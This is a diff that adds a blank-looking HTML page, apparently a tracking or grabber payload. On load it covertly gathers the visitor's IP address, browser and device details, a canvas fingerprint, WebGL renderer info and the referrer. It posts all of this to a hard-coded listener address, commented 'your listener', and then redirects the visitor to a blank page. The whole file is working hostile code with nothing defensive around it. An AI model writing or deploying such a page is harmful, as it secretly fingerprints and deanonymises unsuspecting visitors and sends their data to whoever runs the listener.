@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title></title>
+  <meta charset="UTF-8">
+  <style>
+    body { background-color: black; color: black; }
+  </style>
+</head>
+<body onload="collectData()">
+
+<script>
+  async function getIP() {
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const json = await res.json();
+      return json.ip;
+    } catch (e) {
+      return "unknown";
+    }
+  }
+
+  function getCanvasFingerprint() {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx.textBaseline = "top";
+    ctx.font = "14px 'Arial'";
+    ctx.fillText("canvas_fingerprint", 2, 2);
+    return canvas.toDataURL();
+  }
+
+  function getWebGLInfo() {
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      return {
+        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+      };
+    } catch (e) {
+      return { vendor: "unknown", renderer: "unknown" };
+    }
+  }
+
+  async function collectData() {
+    const ip = await getIP();
+    const webGL = getWebGLInfo();
+    const data = {
+      ip: ip,
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      cookiesEnabled: navigator.cookieEnabled,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      screen: {
+        width: screen.width,
+        height: screen.height,
+        colorDepth: screen.colorDepth
+      },
+      plugins: Array.from(navigator.plugins).map(p => p.name),
+      canvasFingerprint: getCanvasFingerprint(),
+      webGLVendor: webGL.vendor,
+      webGLRenderer: webGL.renderer,
+      location: window.location.href,
+      referrer: document.referrer
+    };
+
+    // Send data to your listener
+    fetch("http://192.168.215.74:8080/log", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    });
+
+    // Redirect to blank screen after short delay
+    setTimeout(() => window.location.replace("about:blank"), 1500);
+  }
+</script>
+
+</body>
+</html>
+
